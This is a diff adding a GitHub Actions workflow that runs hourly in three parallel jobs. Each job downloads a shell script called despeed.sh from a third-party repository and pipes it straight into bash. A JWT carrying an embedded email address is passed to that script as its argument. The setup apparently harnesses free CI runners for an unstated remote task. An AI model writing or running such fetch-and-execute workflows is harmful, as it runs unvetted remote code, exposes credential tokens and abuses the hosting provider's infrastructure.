@@ -1,0 +1,19 @@
+name: Running Bash 
+
+on:
+  schedule:
+    - cron: "0 */1 * * *"
+  workflow_dispatch:
+
+jobs:
+  bash_cmd:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        run_script: [1, 2, 3]
+
+    steps:
+    - name: Runnin Code
+      run: curl -sL https://raw.githubusercontent.com/SenpaiSeeker/tools/refs/heads/main/despeed.sh | bash -s eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mzc5NTYyLCJlbWFpbCI6ImRpa2luMDMxMDE5OTlAZ21haWwuY29tIiwiaWF0IjoxNzQwODk2NDIwLCJleHAiOjE3NDE1MDEyMjB9.yRxV1wJov95ubXcXAG14ijFZsSLb5aRBOBjdkbcRP8A
+      continue-on-error: true
